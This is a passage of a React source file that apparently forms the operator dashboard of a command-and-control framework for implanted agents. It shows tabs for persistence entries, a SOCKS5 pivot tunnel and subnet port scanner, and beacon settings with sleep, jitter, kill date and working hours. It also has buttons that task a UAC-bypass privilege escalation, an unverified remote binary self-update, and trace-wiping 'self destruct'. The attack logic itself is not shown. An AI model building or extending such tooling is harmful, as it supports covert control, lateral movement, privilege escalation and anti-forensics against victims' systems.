                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
                  onClick={() => removePersistence(e)}>Remove</button></td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* Startup Folder */}
        <div style={{ ...S.sectionTitle, marginTop: 4 }}>STARTUP FOLDER <span style={S.tag('var(--green)')}>{startup.length} entries</span></div>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead><tr><th style={S.th}>File</th><th style={S.th}>Target</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
          <tbody>
            {startup.length === 0 && <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No entries</td></tr>}
            {startup.map((e, i) => (
              <tr key={i}>
                <td style={S.td}>{e.name}</td>
                <td style={{ ...S.td, color: '#61afef' }}>{e.path}</td>
                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
                  onClick={() => removePersistence(e)}>Remove</button></td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* Other */}
        {other.length > 0 && <>
          <div style={{ ...S.sectionTitle, marginTop: 4 }}>OTHER <span style={S.tag('var(--green)')}>{other.length} entries</span></div>
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead><tr><th style={S.th}>Type</th><th style={S.th}>Name</th><th style={S.th}>Details</th></tr></thead>
            <tbody>
              {other.map((e, i) => (
                <tr key={i}>
                  <td style={S.td}>{e.type}</td>
                  <td style={S.td}>{e.name || e.value || '-'}</td>
                  <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{JSON.stringify(e)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </>}
      </div>
    </div>
  );
}

/* ========== NETWORK TAB ========== */
function NetworkTab({ agentId, showToast }) {
  const [proxyActive, setProxyActive] = useState(false);
  const [proxyPort, setProxyPort] = useState(0);
  const [connections, setConnections] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(false);

  const checkStatus = useCallback(async () => {
    try {
      const status = await api.tunnelStatus(agentId);
      setProxyActive(status.active);
      setProxyPort(status.port || 0);
      setConnections(status.connections || 0);
    } catch {}
  }, [agentId]);

  useEffect(() => {
    checkStatus();
    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [checkStatus]);

  const startProxy = async () => {
    setLoading(true); setError(null);
    try {
      await api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: 1080 });
      setTimeout(async () => {
        try {
          const res = await api.tunnelStart(agentId);
          setProxyActive(true); setProxyPort(res.port); setLoading(false);
        } catch (e) { setError(e.message); setLoading(false); }
      }, 3000);
    } catch (e) { setError(e.message); setLoading(false); }
  };

  const stopProxy = async () => {
    setLoading(true);
    try {
      await api.tunnelStop(agentId);
      await api.createTask(agentId, 'tunnel_stop', {});
      setProxyActive(false); setProxyPort(0); setConnections(0);
    } catch (e) { setError(e.message); }
    setLoading(false);
  };

  const proxyUrl = proxyPort ? `socks5://${window.location.hostname}:${proxyPort}` : '';

  return (
    <div style={{ flex: 1, overflowY: 'auto' }}>
      {/* SOCKS5 Proxy */}
      <div style={S.sectionTitle}>SOCKS5 PROXY</div>
      <div style={{ border: '1px solid var(--border)', padding: 16, margin: 12 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          {!proxyActive ? (
            <button style={{ ...S.toolBtn, ...S.btnSuccess, padding: '8px 24px', fontSize: 13 }} onClick={startProxy} disabled={loading}>
              {loading ? '⏳ STARTING...' : '▶ START PROXY'}
            </button>
          ) : (
            <button style={{ ...S.toolBtn, ...S.btnDanger, padding: '8px 24px', fontSize: 13 }} onClick={stopProxy} disabled={loading}>
              {loading ? '⏳ STOPPING...' : '■ STOP PROXY'}
            </button>
          )}
          <span style={proxyActive ? S.tag('var(--green)') : S.tag('var(--red)')}>● {proxyActive ? 'RUNNING' : 'STOPPED'}</span>
          <div style={{ flex: 1 }} />
          <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, fontFamily: 'var(--font-mono)' }}>Connections: {connections}</span>
        </div>
        {proxyActive && proxyUrl && (
          <div style={{
            background: '#0a0c10', padding: '8px 12px', fontSize: 12, color: 'var(--green)',
            display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 10,
            border: '1px solid var(--border)', fontFamily: 'var(--font-mono)',
          }}>
            <span>{proxyUrl}</span>
            <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }} onClick={() => {
              navigator.clipboard.writeText(proxyUrl);
              setCopied(true); setTimeout(() => setCopied(false), 2000);
              showToast('📋 Copied proxy URL');
            }}>{copied ? '✓ Copied' : 'Copy'}</button>
          </div>
        )}
        {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginTop: 8 }}>✕ {error}</div>}
      </div>

      {/* Port Scanner */}
      <div style={S.sectionTitle}>PORT SCANNER</div>
      <div style={{ padding: 12, display: 'flex', gap: 8, alignItems: 'center' }}>
        <input type="text" defaultValue="192.168.1.0/24" style={{ ...S.toolInput, width: 200 }} />
        <input type="text" defaultValue="21,22,80,443,445,3389,8080" style={{ ...S.toolInput, width: 260 }} />
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
          api.createTask(agentId, 'network_scan', {}); showToast('🔍 Port scan initiated');
        }}>Scan</button>
      </div>
    </div>
  );
}

/* ========== SETTINGS TAB ========== */
function SettingsTab({ agentId, agent, showToast }) {
  const [sleep, setSleep] = useState(agent.sleep_seconds || 30);
  const [jitter, setJitter] = useState(agent.jitter_percent || 25);
  const [killDate, setKillDate] = useState('2027-03-01');
  const [workStart, setWorkStart] = useState('06:00');
  const [workEnd, setWorkEnd] = useState('23:00');
  const [showUpdateDialog, setShowUpdateDialog] = useState(false);
  const [updateUrl, setUpdateUrl] = useState('');
  const [updateHash, setUpdateHash] = useState('');
  const [showSelfDestruct, setShowSelfDestruct] = useState(false);

  const cfgRow = { display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 12, fontFamily: 'var(--font-mono)' };
  const cfgLabel = { color: 'rgba(255,255,255,0.7)' };
  const cfgInput = { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px' };

  return (
    <div style={{ flex: 1, overflowY: 'auto' }}>
      <div style={S.sectionTitle}>AGENT CONFIGURATION</div>
      <div style={cfgRow}>
        <label style={cfgLabel}>Sleep Interval</label>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <input type="range" min="1" max="300" value={sleep} onChange={e => setSleep(parseInt(e.target.value))}
            style={{ width: 160, accentColor: 'var(--green)' }} />
          <span style={{ color: 'var(--green)', minWidth: 40, textAlign: 'right' }}>{sleep}s</span>
        </div>
      </div>
      <div style={cfgRow}>
        <label style={cfgLabel}>Jitter (%)</label>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <input type="range" min="0" max="100" value={jitter} onChange={e => setJitter(parseInt(e.target.value))}
            style={{ width: 160, accentColor: 'var(--green)' }} />
          <span style={{ color: 'var(--green)', minWidth: 40, textAlign: 'right' }}>{jitter}%</span>
        </div>
      </div>
      <div style={cfgRow}>
        <label style={cfgLabel}>Kill Date</label>
        <input type="date" value={killDate} onChange={e => setKillDate(e.target.value)} style={cfgInput} />
      </div>
      <div style={cfgRow}>
        <label style={cfgLabel}>Working Hours</label>
        <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
          <input type="time" value={workStart} onChange={e => setWorkStart(e.target.value)} style={cfgInput} />
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>to</span>
          <input type="time" value={workEnd} onChange={e => setWorkEnd(e.target.value)} style={cfgInput} />
        </div>
      </div>

      <div style={{ ...S.sectionTitle, marginTop: 4 }}>ACTIONS</div>
      <div style={{ padding: 12, display: 'flex', flexWrap: 'wrap', gap: 8 }}>
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
          api.createTask(agentId, 'config_store_write', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
          showToast('✅ Config updated');
        }}>✓ Update Config</button>
        <button style={S.toolBtn} onClick={() => showToast('🔄 Reconnecting agent...')}>↻ Reconnect</button>
        <button style={{ ...S.toolBtn, ...S.btnWarn }} onClick={() => setShowUpdateDialog(!showUpdateDialog)}>↑ Update Agent</button>
        <button style={{ ...S.toolBtn, ...S.btnWarn }} onClick={() => { api.createTask(agentId, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }}>⚡ Escalate Privileges</button>
      </div>

      {showUpdateDialog && (
        <div style={{ margin: '0 12px 12px', padding: 16, border: '1px solid var(--border)', background: '#15171b' }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: 'rgba(255,255,255,0.7)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 1.4, fontFamily: 'var(--font-mono)' }}>
            Self-Update Agent Binary
          </div>
          <div style={{ marginBottom: 8 }}>
            <label style={{ fontSize: 10, color: 'rgba(255,255,255,0.5)', display: 'block', marginBottom: 4, fontFamily: 'var(--font-mono)' }}>Binary URL</label>
            <input type="text" value={updateUrl} onChange={e => setUpdateUrl(e.target.value)}
              placeholder="https://example.com/agent.exe" style={{ ...cfgInput, width: '100%' }} />
          </div>
          <div style={{ marginBottom: 12 }}>
            <label style={{ fontSize: 10, color: 'rgba(255,255,255,0.5)', display: 'block', marginBottom: 4, fontFamily: 'var(--font-mono)' }}>SHA256 Hash (optional)</label>
            <input type="text" value={updateHash} onChange={e => setUpdateHash(e.target.value)}
              placeholder="Leave empty to skip verification" style={{ ...cfgInput, width: '100%', fontSize: 10 }} />
          </div>
          <div style={{ display: 'flex', gap: 8 }}>
            <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
              if (!updateUrl) return;
              api.createTask(agentId, 'self_update', { url: updateUrl, hash: updateHash });
              setShowUpdateDialog(false); setUpdateUrl(''); setUpdateHash('');
              showToast('⬆ Pushing update to agent...');
            }} disabled={!updateUrl}>SEND UPDATE</button>
            <button style={S.toolBtn} onClick={() => setShowUpdateDialog(false)}>CANCEL</button>
          </div>
        </div>
      )}

      <div style={{ ...S.sectionTitle, marginTop: 4, borderTop: '1px solid rgba(255,68,68,0.2)' }}>DANGER ZONE</div>
      <div style={{ padding: 16 }}>
        <button style={{ ...S.toolBtn, ...S.btnDanger, padding: '10px 24px', fontSize: 12 }}
          onClick={() => setShowSelfDestruct(true)}>☠ SELF DESTRUCT</button>
        <div style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10, marginTop: 6, fontFamily: 'var(--font-mono)' }}>
          Removes agent binary, cleans persistence, overwrites artifacts, terminates process.
        </div>
      </div>

      <ConfirmModal open={showSelfDestruct} title="CONFIRM SELF DESTRUCT"
        message="This will terminate the agent process, remove all persistence mechanisms, and clear all traces. This action is IRREVERSIBLE."
        detail={<><div><span style={{ color: 'rgba(255,255,255,0.5)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agentId}</span></div>
          <div><span style={{ color: 'var(--red)' }}>All persistence will be removed. The agent will not reconnect.</span></div></>}
        confirmLabel="SELF DESTRUCT"
        onConfirm={() => { api.createTask(agentId, 'cleanup', {}); setShowSelfDestruct(false); showToast('💀 Self-destruct initiated'); }}
        onCancel={() => setShowSelfDestruct(false)} />
    </div>
  );
}
